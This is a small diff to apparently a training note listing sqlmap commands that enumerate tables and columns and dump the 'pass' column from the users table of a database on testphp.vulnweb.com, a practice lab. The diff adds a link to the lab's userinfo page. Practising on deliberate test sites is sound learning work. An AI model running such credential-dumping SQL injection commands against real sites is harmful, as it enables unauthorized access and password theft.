@@ -7,3 +7,6 @@ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns
 
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass –dump 
+
+
+Lab: http://testphp.vulnweb.com/userinfo.php
